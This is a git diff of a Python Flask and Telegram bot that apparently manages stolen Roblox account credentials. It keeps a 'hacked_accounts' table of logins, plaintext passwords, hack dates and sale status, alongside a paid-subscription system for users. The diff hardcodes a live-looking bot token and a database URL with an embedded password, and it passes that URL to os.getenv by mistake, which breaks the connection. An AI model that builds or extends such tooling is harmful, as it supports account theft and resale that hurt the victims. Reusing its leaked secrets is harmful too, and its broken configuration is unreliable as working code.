@@ -5,12 +5,14 @@ import psycopg2
 import os
 from datetime import datetime, timedelta
 import requests
+import threading
+import time  # Додано імпорт time
 
 # === Настройки ===
 TOKEN = '8028944732:AAH992DI-fMd3OSjfqfs4pEa3J04Jwb48Q4'
 ADMIN_CHAT_ID = '6956377285'
-DATABASE_URL = os.getenv('DATABASE_URL')
-SITE_URL = os.getenv('SITE_URL', 'https://your-app-name.onrender.com')  # Оновіть після деплою
+DATABASE_URL = os.getenv('postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a/roblox_db')
+SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')  # Оновіть після деплою
 
 app = Flask(__name__)
 bot = telebot.TeleBot(TOKEN)
@@ -29,7 +31,6 @@ def init_db():
     c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                  (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, 
                   prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
-    # Додаємо Создателя
     subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()
     c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
               "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
@@ -37,7 +38,7 @@ def init_db():
     conn.commit()
     conn.close()
 
-# === Keep-alive (опціонально, якщо Render не спить) ===
+# === Keep-alive ===
 def keep_alive():
     while True:
         try:
@@ -45,7 +46,7 @@ def keep_alive():
             print("🔁 Keep-alive ping sent")
         except Exception as e:
             print(f"Keep-alive failed: {e}")
-        time.sleep(300)
+        time.sleep(300)  # Використовуємо time.sleep
 
 # === Робота з базою даних ===
 def get_user(chat_id):
@@ -208,8 +209,7 @@ def setup():
     bot.set_webhook(url=webhook_url)
     init_db()
     return "Webhook and DB set", 200
-
-    # === Команди бота ===
+# === Команди бота ===
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     chat_id = str(message.chat.id)
@@ -545,7 +545,6 @@ def clearold_cmd(message):
     bot.reply_to(message, f"✅ Удалено старых паролей: {deleted}")
 
 if __name__ == "__main__":
-    import threading
     threading.Thread(target=keep_alive, daemon=True).start()
     port = int(os.environ.get('PORT', 10000))
     app.run(host='0.0.0.0', port=port)
